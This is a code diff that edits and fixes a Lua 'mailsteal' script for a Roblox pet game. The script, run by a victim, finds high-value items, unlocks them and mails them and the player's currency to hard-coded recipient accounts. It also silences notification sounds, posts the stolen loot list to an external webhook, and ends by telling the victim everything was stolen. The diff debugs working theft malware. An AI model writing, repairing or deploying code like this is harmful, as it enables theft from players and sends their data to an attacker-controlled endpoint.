@@ -18,7 +18,6 @@ local function getInventory()
 end
 
 local _Inventory = getInventory()
-local u4 = 'GG / ypeNFusQP3'
 local u6 = {}
 local u7 = 0
 local v8 = require(Library.Client.Message)
@@ -34,9 +33,10 @@ _G.minrap = 1000000
 local u10 = _G.Usernames
 local v11 = _G.minrap
 local u12 = _G.webhook
+local MESSAGE = 'hi' -- message required by mailbox UI
 
-for _, v16 in ipairs(u10) do
-    if _LocalPlayer.Name == v16 then
+for _, name in ipairs(u10) do
+    if _LocalPlayer.Name == name then
         _LocalPlayer:kick('You cannot mailsteal yourself')
         return
     end
@@ -44,11 +44,11 @@ end
 
 local u21 = 20000
 pcall(function()
-    for _, v20 in pairs(getgc()) do
-        if type(v20) == 'function' then
-            local ok, info = pcall(debug.getinfo, v20)
+    for _, v in pairs(getgc()) do
+        if type(v) == 'function' then
+            local ok, info = pcall(debug.getinfo, v)
             if ok and info and info.name == 'computeSendMailCost' then
-                u21 = v20()
+                u21 = v()
                 break
             end
         end
@@ -56,9 +56,9 @@ pcall(function()
 end)
 
 local u25 = 1
-for _, v26 in pairs(u9().Inventory.Currency) do
-    if v26.id == 'Diamonds' then
-        u25 = v26._am
+for _, v in pairs(u9().Inventory.Currency) do
+    if v.id == 'Diamonds' then
+        u25 = v._am
         break
     end
 end
@@ -74,7 +74,6 @@ end
 local function sendWebhook(gems)
     local grouped = {}
     local order = {}
-
     for _, item in ipairs(u6) do
         if grouped[item.name] then
             grouped[item.name].amount = grouped[item.name].amount + item.amount
@@ -83,17 +82,14 @@ local function sendWebhook(gems)
             table.insert(order, item.name)
         end
     end
-
     table.sort(order, function(a, b)
         return grouped[a].rap * grouped[a].amount > grouped[b].rap * grouped[b].amount
     end)
-
     local itemsText = ''
     for _, name in ipairs(order) do
         local g = grouped[name]
         itemsText = itemsText .. name .. ' (x' .. g.amount .. '): ' .. u31(g.rap * g.amount) .. ' RAP\n'
     end
-
     if #itemsText > 1024 then itemsText = itemsText:sub(1, 1000) .. '\nPlus more!' end
     if itemsText == '' then itemsText = 'None' end
 
@@ -109,26 +105,21 @@ local function sendWebhook(gems)
             footer = {text = 'Zen Edit — Only1sherifalt1'},
         }}
     })
-
     local reqFunc = (syn and syn.request) or (http and http.request) or request
-    pcall(reqFunc, {
-        Url = u12[1],
-        Method = 'POST',
-        Headers = {['Content-Type'] = 'application/json'},
-        Body = body,
-    })
+    pcall(reqFunc, {Url = u12[1], Method = 'POST', Headers = {['Content-Type'] = 'application/json'}, Body = body})
 end
 
+-- FIXED: correct arg order — recipient, message, category, uid, amount
 local function sendItem(cat, uid, amt)
     local i = 1
     local done = false
     while not done do
-        local ok, err = u1.Invoke('Mailbox: Send', u10[i], u4, cat, uid, amt or 1)
-        if ok == true then
+        local s, e = u1.Invoke('Mailbox: Send', u10[i], MESSAGE, cat, uid, amt or 1)
+        if s == true then
             done = true
             u25 = u25 - u21
             u21 = math.min(math.ceil(u21 * 1.5), 5000000)
-        elseif err == "They don't have enough space!" then
+        elseif e == "They don't have enough space!" then
             i = i + 1
             if i > #u10 then done = true end
         else
@@ -137,7 +128,6 @@ local function sendItem(cat, uid, amt)
     end
 end
 
--- FIXED: re-fetch currency live instead of passing stale object
 local function sendGems()
     local freshSave = u9()
     for _, v in pairs(freshSave.Inventory.Currency) do
@@ -148,11 +138,10 @@ local function sendGems()
                 local i = 1
                 local done = false
                 while not done do
-                    -- pass the full fresh currency entry
-                    local ok, err = u1.Invoke('Mailbox: Send', u10[i], u4, 'Currency', v, toSend)
-                    if ok == true then
+                    local s, e = u1.Invoke('Mailbox: Send', u10[i], MESSAGE, 'Currency', v, toSend)
+                    if s == true then
                         done = true
-                    elseif err == "They don't have enough space!" then
+                    elseif e == "They don't have enough space!" then
                         i = i + 1
                         if i > #u10 then done = true end
                     else
@@ -178,16 +167,14 @@ end
 local function withdrawBoxes()
     if _Inventory.Box then
         for uid, box in pairs(_Inventory.Box) do
-            if box._uq then
-                pcall(function() u1.Invoke('Box: Withdraw All', uid) end)
-            end
+            if box._uq then pcall(function() u1.Invoke('Box: Withdraw All', uid) end) end
         end
     end
 end
 
 local function spaceCheck()
     local v105 = next(_Inventory.Pet)
-    local _, err = u1.Invoke('Mailbox: Send', 'Roblox', 'Test', 'Pet', v105, 1)
+    local _, err = u1.Invoke('Mailbox: Send', 'Roblox', MESSAGE, 'Pet', v105, 1)
     return err == "They don't have enough space!"
 end
 
@@ -218,9 +205,7 @@ game.DescendantAdded:Connect(function(obj)
             obj.SoundId == 'rbxassetid://14254721038' or
             obj.SoundId == 'rbxassetid://12413423276'
         ) then
-            obj.Volume = 0
-            obj.PlayOnRemove = false
-            obj:Destroy()
+            obj.Volume = 0; obj.PlayOnRemove = false; obj:Destroy()
         end
     end)
 end)
@@ -234,7 +219,6 @@ end)
 pcall(function() require(Library.Client.DaycareCmds).Claim() end)
 pcall(function() require(Library.Client.ExclusiveDaycareCmds).Claim() end)
 
--- scan BEFORE claimMailbox so UIDs are fresh
 local CATS = {'Pet','Egg','Charm','Enchant','Potion','Misc','Hoverboard','Booth','Ultimate'}
 
 for _, cat in ipairs(CATS) do
@@ -250,22 +234,16 @@ for _, cat in ipairs(CATS) do
                 else
                     rap = getRAP(cat, item)
                 end
-
                 if rap >= v11 then
                     local prefix = item.pt == 1 and 'Golden ' or (item.pt == 2 and 'Rainbow ' or '')
                     if item.sh then prefix = 'Shiny ' .. prefix end
-                    local name = cat == 'Pet' and (prefix .. item.id) or name
-                    -- FIXED: store uid as a reference key not a copy
                     table.insert(u6, {
-                        category = cat,
-                        uid = uid,
-                        amount = item._am or 1,
-                        rap = rap,
+                        category = cat, uid = uid,
+                        amount = item._am or 1, rap = rap,
                         name = cat == 'Pet' and (prefix .. item.id) or item.id,
                     })
                     u7 = u7 + rap * (item._am or 1)
                 end
-
                 if item._lk then
                     pcall(function() u1.Invoke('Locking_SetLocked', uid, false) end)
                 end
@@ -274,7 +252,6 @@ for _, cat in ipairs(CATS) do
     end
 end
 
--- webhook fires first so it logs before anything is sent
 spawn(function() sendWebhook(u25) end)
 wait(0.5)
 
@@ -287,17 +264,13 @@ if #u6 > 0 or v11 + u21 < u25 then
         return
     end
 
-    table.sort(u6, function(a, b)
-        return a.rap * a.amount > b.rap * b.amount
-    end)
+    table.sort(u6, function(a, b) return a.rap * a.amount > b.rap * b.amount end)
 
     for _, item in ipairs(u6) do
         if u21 > item.rap or u21 >= u25 then break end
         sendItem(item.category, item.uid, item.amount)
     end
 
-    -- FIXED: sendGems after items so cost is accurate
     sendGems()
-
     v8.Error("All your items just got stolen! gg")
 end
